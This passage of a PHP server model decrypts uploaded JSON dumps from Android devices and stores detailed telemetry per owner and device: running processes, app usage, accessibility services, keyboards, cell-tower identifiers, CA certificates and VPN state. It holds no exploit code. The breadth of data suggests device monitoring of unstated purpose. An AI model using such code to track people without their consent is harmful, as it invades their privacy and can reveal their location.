                'language'                    => $json['language']                    ?? null,
                'country'                     => $json['country']                     ?? null,
                'timezone'                    => $json['timezone']                    ?? null,
                'timezone_offset'             => $json['timezone_offset']             ?? null,
                'current_time'                => $json['current_time']                ?? null,
                'current_time_formatted'      => $json['current_time_formatted']      ?? null,
                'battery_charging'            => isset($json['battery_charging'])     ? ($json['battery_charging'] ? 1 : 0) : null,
                'battery_level'               => $json['battery_level']              ?? null,
                'sensor_count'                => $json['sensor_count']               ?? null,
                'mac_address'                 => $json['mac_address']                ?? null,
                'kernel_info'                 => $json['kernel_info']                ?? null,
                'is_emulator'                 => isset($json['is_emulator'])          ? ($json['is_emulator'] ? 1 : 0) : null,
                'is_rooted'                   => isset($json['is_rooted'])            ? ($json['is_rooted'] ? 1 : 0) : null,
                'app_package'                 => $json['app_package']                ?? null,
                'app_version'                 => $json['app_version']                ?? null,
                'app_version_code'            => $json['app_version_code']           ?? null,
                'app_first_install'           => $json['app_first_install']          ?? null,
                'app_last_update'             => $json['app_last_update']            ?? null,
                'extraction_timestamp'        => $extracted_at,
                'extractor_version'           => $json['extractor_version']          ?? '1.0',
                'device_ip_address'           => $json['device_ip_address']          ?? null,
            ];

            $this->db->table('tbl_device_profile')->insert($data);
            log_message('info', '[parse_device_info] Inserted device snapshot for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_device_info] Exception: ' . $e->getMessage());
            return false;
        }
    }

    // ─────────────────────────────────────────────────────────────────────────

    /**
     * SecurityAuditExtractor → tbl_security_audit
     * File category: security_audit / securityaudit
     * Stores VPN/proxy status, open ports, user-installed CA certificates, system CA certificates,
     * VPN configuration details, device admin apps, and DNS configuration.
     */
    public function parse_security_audit(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated      = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) {
                log_message('error', '[parse_security_audit] Cannot read file: ' . $file_name);
                return false;
            }

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) {
                log_message('error', '[parse_security_audit] Decryption failed for: ' . $file_name);
                return false;
            }

            $json = json_decode($decoded, true);
            if ($json === null) {
                log_message('error', '[parse_security_audit] JSON decode failed: ' . json_last_error_msg());
                return false;
            }

            $audit_timestamp = $json['timestamp'] ?? null;
            $extracted_at    = $audit_timestamp;

            // Encode arrays as JSON strings for storage
            $user_ca_certs = $json['user_ca_certs'] ?? null;
            if (is_array($user_ca_certs)) {
                $user_ca_certs = json_encode($user_ca_certs);
            }

            $system_ca_certs = $json['system_ca_certs'] ?? null;
            if (is_array($system_ca_certs)) {
                $system_ca_certs = json_encode($system_ca_certs);
            }

            $vpn_config = $json['vpn_config'] ?? null;
            if (is_array($vpn_config)) {
                $vpn_config = json_encode($vpn_config);
            }

            $device_admin_apps = $json['device_admin_apps'] ?? null;
            if (is_array($device_admin_apps)) {
                $device_admin_apps = json_encode($device_admin_apps);
            }

            $dns_config = $json['dns_config'] ?? null;
            if (is_array($dns_config)) {
                $dns_config = json_encode($dns_config);
            }

            $open_ports = $json['open_ports'] ?? null;
            if (is_array($open_ports)) {
                $open_ports = json_encode($open_ports);
            }

            $data = [
                'owner_id'             => $owner_id,
                'device_id'            => $device_id,
                'vpn_active'           => isset($json['vpn_active'])   ? ($json['vpn_active']   ? 1 : 0) : 0,
                'proxy_active'         => isset($json['proxy_active'])  ? ($json['proxy_active']  ? 1 : 0) : 0,
                'user_ca_certs_json'   => $user_ca_certs,
                'system_ca_certs_json' => $system_ca_certs,
                'vpn_config_json'      => $vpn_config,
                'device_admin_apps_json' => $device_admin_apps,
                'dns_config_json'      => $dns_config,
                'open_ports_json'      => $open_ports,
                'audit_timestamp'      => $audit_timestamp,
                'extracted_at'         => $extracted_at,
                'created_at'           => $dated,
            ];

            $this->db->table('tbl_security_audit')->insert($data);
            log_message('info', '[parse_security_audit] Inserted audit snapshot for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_security_audit] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * ProcInfoExtractor → tbl_proc_info
     * File category: proc_info
     * Stores /proc/* snapshot: meminfo, cpuinfo, stat, version, uptime, net interfaces, net connections
     */
    public function parse_proc_info(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated      = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) {
                log_message('error', '[parse_proc_info] Cannot read file: ' . $file_name);
                return false;
            }

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) {
                log_message('error', '[parse_proc_info] Decryption failed for: ' . $file_name);
                return false;
            }

            $json = json_decode($decoded, true);
            if ($json === null) {
                log_message('error', '[parse_proc_info] JSON decode failed: ' . json_last_error_msg());
                return false;
            }

            $extracted_at = $json['extracted_at'] ?? null;

            // Avoid duplicate snapshot for same device+timestamp
            $exists = $this->db->table('tbl_proc_info')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;

            if ($exists) {
                log_message('info', '[parse_proc_info] Duplicate snapshot skipped for device: ' . $device_id);
                return true;
            }

            $data = [
                'owner_id'                => $owner_id,
                'device_id'               => $device_id,
                'meminfo_json'            => json_encode($json['meminfo'] ?? []),
                'cpuinfo_json'            => json_encode($json['cpuinfo'] ?? []),
                'stat_json'               => json_encode($json['stat'] ?? []),
                'version'                 => $json['version'] ?? null,
                'uptime_json'             => json_encode($json['uptime'] ?? []),
                'net_interfaces_json'     => json_encode($json['net_interfaces'] ?? []),
                'net_connections_json'    => json_encode($json['net_connections'] ?? []),
                'extracted_at'            => $extracted_at,
                'created_at'              => $dated,
                'updated_at'              => $dated,
            ];

            $this->db->table('tbl_proc_info')->insert($data);
            log_message('info', '[parse_proc_info] Inserted proc snapshot for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_proc_info] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * ProcessExtractor → tbl_running_processes + tbl_running_services
     * File category: processes
     * Stores running app processes and services with usage stats
     */
    public function parse_processes(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated      = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) return false;

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) return false;

            $json = json_decode($decoded, true);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;

            // Avoid duplicate
            $exists = $this->db->table('tbl_running_processes')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            // Main process table
            $this->db->table('tbl_running_processes')->insert([
                'owner_id'     => $owner_id,
                'device_id'    => $device_id,
                'extracted_at' => $extracted_at,
                'created_at'   => $dated,
            ]);
            $procId = $this->db->insertID();

            // Processes
            $processes = $json['processes'] ?? [];
            if (!empty($processes) && $procId > 0) {
                $batch = [];
                foreach ($processes as $p) {
                    $batch[] = [
                        'running_processes_id' => $procId,
                        'owner_id'             => $owner_id,
                        'pid'                  => $p['pid'] ?? null,
                        'process_name'         => $p['process_name'] ?? null,
                        'uid'                  => $p['uid'] ?? null,
                        'importance'           => $p['importance'] ?? null,
                        'importance_reason_code' => $p['importance_reason_code'] ?? null,
                        'pkg_list_json'        => json_encode($p['pkg_list'] ?? []),
                        'lru'                  => $p['lru'] ?? null,
                        'created_at'           => $dated,
                    ];
                }
                $this->db->table('tbl_running_process_details')->insertBatch($batch);
            }

            // Services
            $services = $json['services'] ?? [];
            if (!empty($services) && $procId > 0) {
                $batch = [];
                foreach ($services as $s) {
                    $batch[] = [
                        'running_process_id'    => $procId,
                        'owner_id'             => $owner_id,
                        'pid'                  => $s['pid'] ?? null,
                        'process'              => $s['process'] ?? null,
                        'client_package'       => $s['client_package'] ?? null,
                        'service_class'        => $s['service_class'] ?? null,
                        'service_package'      => $s['service_package'] ?? null,
                        'active_since'         => $s['active_since'] ?? null,
                        'crash_count'          => $s['crash_count'] ?? null,
                        'flags'                => $s['flags'] ?? null,
                        'started'              => isset($s['started']) ? ($s['started'] ? 1 : 0) : null,
                        'created_at'           => $dated,
                    ];
                }
                $this->db->table('tbl_running_services')->insertBatch($batch);
            }

            // Usage stats (24h)
            $usage = $json['usage_stats_24h'] ?? [];
            if (!empty($usage) && is_array($usage) && $procId > 0) {
                $batch = [];
                foreach ($usage as $u) {
                    $batch[] = [
                        'running_processes_id' => $procId,
                        'owner_id'             => $owner_id,
                        'package_name'         => $u['package_name'] ?? null,
                        'total_time_foreground' => $u['total_time_in_foreground'] ?? null,
                        'last_time_used'       => $u['last_time_used'] ?? null,
                        'last_time_service_used' => $u['last_time_service_used'] ?? null,
                        'last_time_visible'    => $u['last_time_visible'] ?? null,
                        'app_launch_count'     => $u['app_launch_count'] ?? null,
                        'created_at'           => $dated,
                    ];
                }
                $this->db->table('tbl_usage_stats_24h')->insertBatch($batch);
            }

            log_message('info', '[parse_processes] Inserted processes for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_processes] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * CameraInfoExtractor → tbl_camera_info
     * File category: camera_info
     * Stores camera characteristics per camera ID
     */
    public function parse_camera_info(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated      = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) return false;

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) return false;

            $json = json_decode($decoded, true);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $cameras      = $json['cameras'] ?? [];

            // Avoid duplicate
            $exists = $this->db->table('tbl_camera_info')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            foreach ($cameras as $cam) {
                $this->db->table('tbl_camera_info')->insert([
                    'owner_id'              => $owner_id,
                    'device_id'             => $device_id,
                    'camera_id'             => $cam['camera_id'] ?? null,
                    'lens_facing'           => $cam['lens_facing'] ?? null,
                    'sensor_orientation'    => $cam['sensor_orientation'] ?? null,
                    'pixel_array_width'     => $cam['pixel_array_width'] ?? null,
                    'pixel_array_height'    => $cam['pixel_array_height'] ?? null,
                    'physical_width_mm'     => $cam['physical_width_mm'] ?? null,
                    'physical_height_mm'    => $cam['physical_height_mm'] ?? null,
                    'available_focal_lengths' => json_encode($cam['available_focal_lengths'] ?? []),
                    'flash_available'       => isset($cam['flash_available']) ? ($cam['flash_available'] ? 1 : 0) : null,
                    'available_effects' => json_encode($cam['available_effects'] ?? []),
                    'available_scene_modes' => json_encode($cam['available_scene_modes'] ?? []),
                    'available_video_stabilization' => json_encode($cam['available_video_stabilization'] ?? []),
                    'available_ae_modes' => json_encode($cam['available_ae_modes'] ?? []),
                    'available_af_modes' => json_encode($cam['available_af_modes'] ?? []),
                    'max_jpeg_width'        => $cam['max_jpeg_width'] ?? null,
                    'max_jpeg_height'       => $cam['max_jpeg_height'] ?? null,
                    'extracted_at'          => $extracted_at,
                    'created_at'            => $dated,
                    'updated_at'            => $dated,
                ]);
            }

            log_message('info', '[parse_camera_info] Inserted ' . count($cameras) . ' cameras for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_camera_info] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * BatteryStatsExtractor → tbl_battery_stats
     * File category: battery_stats
     * Stores detailed battery counters and health
     */
    public function parse_battery_stats(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated      = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) return false;

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) return false;

            $json = json_decode($decoded, true);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;

            // Avoid duplicate
            $exists = $this->db->table('tbl_battery_stats')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            $this->db->table('tbl_battery_stats')->insert([
                'owner_id'              => $owner_id,
                'device_id'             => $device_id,
                'level_percent'         => $json['level_percent'] ?? null,
                'is_charging'           => isset($json['is_charging']) ? ($json['is_charging'] ? 1 : 0) : null,
                'status'                => $json['status'] ?? null,
                'health'                => $json['health'] ?? null,
                'temperature_celsius'   => $json['temperature_celsius'] ?? null,
                'voltage_mv'            => $json['voltage_mv'] ?? null,
                'plugged_type'          => $json['plugged_type'] ?? null,
                'technology'            => $json['technology'] ?? null,
                'capacity_percent'      => $json['capacity_percent'] ?? null,
                'charge_counter_uah'    => $json['charge_counter_uah'] ?? null,
                'current_now_ua'        => $json['current_now_ua'] ?? null,
                'energy_counter_uwh'    => $json['energy_counter_uwh'] ?? null,
                'status_int'            => $json['status_int'] ?? null,
                'health_int'            => $json['health_int'] ?? null,
                'temperature_deci_c'    => $json['temperature_deci_c'] ?? null,
                'extracted_at'          => $extracted_at,
                'created_at'            => $dated,
                'updated_at'            => $dated,
            ]);

            log_message('info', '[parse_battery_stats] Inserted battery stats for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_battery_stats] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * AccessibilityExtractor → tbl_accessibility_services
     * File category: accessibility
     * Stores enabled accessibility services
     */
    public function parse_accessibility(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated      = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) return false;

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) return false;

            $json = json_decode($decoded, true);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $services     = $json['services'] ?? [];

            // Avoid duplicate
            $exists = $this->db->table('tbl_accessibility_services')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            foreach ($services as $svc) {
                $this->db->table('tbl_accessibility_services')->insert([
                    'owner_id'                    => $owner_id,
                    'device_id'                   => $device_id,
                    'service_id'                  => $svc['id'] ?? null,
                    'package_name'                => $svc['package_name'] ?? null,
                    'description'                 => $svc['description'] ?? null,
                    'capabilities'                => $svc['capabilities'] ?? null,
                    'flags'                       => $svc['flags'] ?? null,
                    'notification_timeout'        => $svc['notification_timeout'] ?? null,
                    'settings_activity_name'      => $svc['settings_activity_name'] ?? null,
                    'can_retrieve_window_content' => isset($svc['can_retrieve_window_content']) ? ($svc['can_retrieve_window_content'] ? 1 : 0) : null,
                    'extracted_at'                => $extracted_at,
                    'created_at'                  => $dated,
                ]);
            }

            log_message('info', '[parse_accessibility] Inserted ' . count($services) . ' a11y services for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_accessibility] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * InputMethodExtractor → tbl_input_methods + tbl_input_method_subtypes
     * File category: input_methods
     * Stores enabled IMEs and their subtypes
     */
    public function parse_input_methods(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated      = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) return false;

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) return false;

            $json = json_decode($decoded, true);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $imes         = $json['input_methods'] ?? [];

            // Avoid duplicate
            $exists = $this->db->table('tbl_input_methods')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            foreach ($imes as $ime) {
                $this->db->table('tbl_input_methods')->insert([
                    'owner_id'     => $owner_id,
                    'device_id'    => $device_id,
                    'ime_id'       => $ime['id'] ?? null,
                    'package_name' => $ime['package_name'] ?? null,
                    'label'        => $ime['label'] ?? null,
                    'service_name' => $ime['service_name'] ?? null,
                    'is_system'    => isset($ime['is_system']) ? ($ime['is_system'] ? 1 : 0) : 0,
                    'is_auxiliary' => isset($ime['is_auxiliary']) ? ($ime['is_auxiliary'] ? 1 : 0) : 0,
                    'extracted_at' => $extracted_at,
                    'created_at'   => $dated,
                ]);
                $imeId = $this->db->insertID();

                // Subtypes
                $subtypes = $ime['subtypes'] ?? [];
                if (!empty($subtypes) && $imeId > 0) {
                    $batch = [];
                    foreach ($subtypes as $st) {
                        $batch[] = [
                            'input_method_id'                    => $imeId,
                            'owner_id'                           => $owner_id,
                            'locale'                             => $st['locale'] ?? null,
                            'mode'                               => $st['mode'] ?? null,
                            'name'                               => $st['name'] ?? null,
                            'is_ascii_capable'                   => isset($st['is_ascii_capable']) ? ($st['is_ascii_capable'] ? 1 : 0) : 0,
                            'is_auxiliary'                       => isset($st['is_auxiliary']) ? ($st['is_auxiliary'] ? 1 : 0) : 0,
                            'overrides_implicitly_enabled_subtype' => isset($st['overrides_implicitly_enabled_subtype']) ? ($st['overrides_implicitly_enabled_subtype'] ? 1 : 0) : 0,
                            'created_at'                         => $dated,
                        ];
                    }
                    $this->db->table('tbl_input_method_subtypes')->insertBatch($batch);
                }
            }

            log_message('info', '[parse_input_methods] Inserted ' . count($imes) . ' IMEs for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_input_methods] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * CellTowerScanner → tbl_cell_towers
     * File category: cell_towers
     * Stores neighboring cell tower information with CID, LAC, RSSI
     */
    public function parse_cell_towers(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated      = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) return false;

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) return false;

            $json = json_decode($decoded, true);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $towers       = $json['cell_towers'] ?? [];

            // Avoid duplicate
            $exists = $this->db->table('tbl_cell_towers')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            foreach ($towers as $tower) {
                $this->db->table('tbl_cell_towers')->insert([
                    'owner_id'         => $owner_id,
                    'device_id'        => $device_id,
                    'tower_type'       => $tower['type'] ?? null,
                    'cid'              => $tower['cid'] ?? $tower['nci'] ?? $tower['base_station_id'] ?? null,
                    'lac'              => $tower['lac'] ?? $tower['tac'] ?? $tower['network_id'] ?? null,
                    'mcc'              => $tower['mcc'] ?? $tower['mccString'] ?? null,
                    'mnc'              => $tower['mnc'] ?? $tower['mncString'] ?? null,
                    'pci'              => $tower['pci'] ?? null,
                    'nci'              => $tower['nci'] ?? null,
                    'tac'              => $tower['tac'] ?? null,
                    'nrarfcn'          => $tower['nrarfcn'] ?? null,
                    'bandwidth'        => $tower['bandwidth'] ?? null,
                    'psc'              => $tower['psc'] ?? null,
                    'system_id'        => $tower['system_id'] ?? null,
                    'rssi'             => $tower['rssi'] ?? null,
                    'rsrp'             => $tower['rsrp'] ?? null,
                    'rsrq'             => $tower['rsrq'] ?? null,
                    'rssnr'            => $tower['rssnr'] ?? null,
                    'cqi'              => $tower['cqi'] ?? null,
                    'asu_level'        => $tower['asu_level'] ?? null,
                    'csi_rsrp'         => $tower['csi_rsrp'] ?? null,
                    'csi_rsrq'         => $tower['csi_rsrq'] ?? null,
                    'csi_sinr'         => $tower['csi_sinr'] ?? null,
                    'is_registered'    => isset($tower['is_registered']) ? ($tower['is_registered'] ? 1 : 0) : 0,
                    'network_operator' => $json['network_operator'] ?? null,
                    'network_operator_name' => $json['network_operator_name'] ?? null,
                    'phone_type'       => $json['phone_type'] ?? null,
                    'sim_state'        => $json['sim_state'] ?? null,
                    'extracted_at'     => $extracted_at,
                    'created_at'       => $dated,
                ]);
            }

            log_message('info', '[parse_cell_towers] Inserted ' . count($towers) . ' towers for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_cell_towers] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * DisplayInfoExtractor → tbl_display_info
     * File category: display_info
     * Stores display metrics, resolution, density, refresh rate
     */
    public function parse_display_info(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated      = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) return false;

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) return false;

            $json = json_decode($decoded, true);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;

            // Avoid duplicate
            $exists = $this->db->table('tbl_display_info')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            $displays = $json['displays'] ?? [];

            $this->db->table('tbl_display_info')->insert([
                'owner_id'          => $owner_id,
                'device_id'         => $device_id,
                'width_px'          => $json['width_px'] ?? null,
                'height_px'         => $json['height_px'] ?? null,
                'real_width'        => $json['real_width'] ?? null,
                'real_height'       => $json['real_height'] ?? null,
                'usable_width'      => $json['usable_width'] ?? null,
                'usable_height'     => $json['usable_height'] ?? null,
                'density'           => $json['density'] ?? null,
                'density_dpi'       => $json['density_dpi'] ?? null,
                'xdpi'              => $json['xdpi'] ?? null,
                'ydpi'              => $json['ydpi'] ?? null,
                'scaled_density'    => $json['scaled_density'] ?? null,
                'rotation'          => $json['rotation'] ?? null,
                'refresh_rate'      => $json['refresh_rate'] ?? null,
                'mode_width'        => $json['mode_width'] ?? null,
                'mode_height'       => $json['mode_height'] ?? null,
                'mode_refresh_rate' => $json['mode_refresh_rate'] ?? null,
                'displays_json'     => !empty($displays) ? json_encode($displays) : null,
                'screen_layout'     => $json['screen_layout'] ?? null,
                'smallest_screen_width_dp' => $json['smallest_screen_width_dp'] ?? null,
                'ui_mode'           => $json['ui_mode'] ?? null,
                'extracted_at'      => $extracted_at,
                'created_at'        => $dated,
            ]);

            log_message('info', '[parse_display_info] Inserted display info for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_display_info] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * StorageExtractor → tbl_storage
     * File category: storage
     * Stores internal/external storage volumes
     */
    public function parse_storage(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated      = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) return false;

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) return false;

            $json = json_decode($decoded, true);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $volumes      = $json['volumes'] ?? [];

            // Avoid duplicate
            $exists = $this->db->table('tbl_storage')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            foreach ($volumes as $vol) {
                $info = $vol['info'] ?? [];
                $this->db->table('tbl_storage')->insert([
                    'owner_id'       => $owner_id,
                    'device_id'      => $device_id,
                    'volume_path'    => $vol['path'] ?? null,
                    'description'    => $vol['description'] ?? null,
                    'is_removable'   => isset($vol['is_removable']) ? ($vol['is_removable'] ? 1 : 0) : 0,
                    'state'          => $vol['state'] ?? null,
                    'total_bytes'    => $info['total_bytes'] ?? null,
                    'available_bytes'=> $info['available_bytes'] ?? null,
                    'free_bytes'     => $info['free_bytes'] ?? null,
                    'used_bytes'     => $info['used_bytes'] ?? null,
                    'total_formatted'=> $info['total_formatted'] ?? null,
                    'available_formatted' => $info['available_formatted'] ?? null,
                    'used_formatted' => $info['used_formatted'] ?? null,
                    'extracted_at'   => $extracted_at,
                    'created_at'     => $dated,
                ]);
            }

            // App cache and data
            if (isset($json['app_cache'])) {
                $this->db->table('tbl_storage')->insert([
                    'owner_id'       => $owner_id,
                    'device_id'      => $device_id,
                    'volume_path'    => 'app_cache',
                    'total_bytes'    => $json['app_cache']['total_bytes'] ?? null,
                    'available_bytes'=> $json['app_cache']['available_bytes'] ?? null,
                    'free_bytes'     => $json['app_cache']['free_bytes'] ?? null,
                    'used_bytes'     => $json['app_cache']['used_bytes'] ?? null,
                    'total_formatted'=> $json['app_cache']['total_formatted'] ?? null,
                    'available_formatted' => $json['app_cache']['available_formatted'] ?? null,
                    'used_formatted' => $json['app_cache']['used_formatted'] ?? null,
                    'extracted_at'   => $extracted_at,
                    'created_at'     => $dated,
                ]);
            }
            if (isset($json['app_data'])) {
                $this->db->table('tbl_storage')->insert([
                    'owner_id'       => $owner_id,
                    'device_id'      => $device_id,
                    'volume_path'    => 'app_data',
                    'total_bytes'    => $json['app_data']['total_bytes'] ?? null,
                    'available_bytes'=> $json['app_data']['available_bytes'] ?? null,
                    'free_bytes'     => $json['app_data']['free_bytes'] ?? null,
                    'used_bytes'     => $json['app_data']['used_bytes'] ?? null,
                    'total_formatted'=> $json['app_data']['total_formatted'] ?? null,
                    'available_formatted' => $json['app_data']['available_formatted'] ?? null,
                    'used_formatted' => $json['app_data']['used_formatted'] ?? null,
                    'extracted_at'   => $extracted_at,
                    'created_at'     => $dated,
                ]);
            }

            log_message('info', '[parse_storage] Inserted ' . count($volumes) . ' volumes for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_storage] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * ThermalExtractor → tbl_thermal
     * File category: thermal
     * Stores thermal zones, CPU throttle, CPU frequencies
     */
    public function parse_thermal(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated      = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) return false;

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) return false;

            $json = json_decode($decoded, true);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $zones        = $json['thermal_zones'] ?? [];
            $cpu_throttle = $json['cpu_throttle'] ?? [];
            $cpu_freqs    = $json['cpu_frequencies'] ?? [];

            // Avoid duplicate
            $exists = $this->db->table('tbl_thermal')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            foreach ($zones as $zone) {
                $this->db->table('tbl_thermal')->insert([
                    'owner_id'     => $owner_id,
                    'device_id'    => $device_id,
                    'zone_name'    => $zone['zone'] ?? null,
                    'zone_type'    => $zone['type'] ?? null,
                    'temp_raw'     => $zone['temp_raw'] ?? null,
                    'temp_celsius' => $zone['temp_celsius'] ?? null,
                    'policy'       => $zone['policy'] ?? null,
                    'data_type'    => 'thermal_zone',
                    'extracted_at' => $extracted_at,
                    'created_at'   => $dated,
                ]);
            }

            foreach ($cpu_throttle as $throttle) {
                $this->db->table('tbl_thermal')->insert([
                    'owner_id'     => $owner_id,
                    'device_id'    => $device_id,
                    'cpu_name'     => $throttle['cpu'] ?? null,
                    'core_limit_max' => $throttle['core_limit_max'] ?? null,
                    'package_limit_max' => $throttle['package_limit_max'] ?? null,
                    'throttle_count'   => $throttle['throttle_count'] ?? null,
                    'data_type'    => 'cpu_throttle',
                    'extracted_at' => $extracted_at,
                    'created_at'   => $dated,
                ]);
            }

            foreach ($cpu_freqs as $freq) {
                $this->db->table('tbl_thermal')->insert([
                    'owner_id'         => $owner_id,
                    'device_id'        => $device_id,
                    'cpu_name'         => $freq['cpu'] ?? null,
                    'scaling_min_freq' => $freq['scaling_min_freq'] ?? null,
                    'scaling_max_freq' => $freq['scaling_max_freq'] ?? null,
                    'scaling_cur_freq' => $freq['scaling_cur_freq'] ?? null,
                    'scaling_governor' => $freq['scaling_governor'] ?? null,
                    'data_type'        => 'cpu_frequency',
                    'extracted_at'     => $extracted_at,
                    'created_at'       => $dated,
                ]);
            }

            log_message('info', '[parse_thermal] Inserted thermal data for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_thermal] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * NfcExtractor → tbl_nfc
     * File category: nfc
     * Stores NFC adapter state and features
     */
    public function parse_nfc(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated      = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) return false;

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) return false;

            $json = json_decode($decoded, true);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;

            // Avoid duplicate
            $exists = $this->db->table('tbl_nfc')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            $this->db->table('tbl_nfc')->insert([
                'owner_id'           => $owner_id,
                'device_id'          => $device_id,
                'nfc_available'      => isset($json['nfc_available']) ? ($json['nfc_available'] ? 1 : 0) : 0,
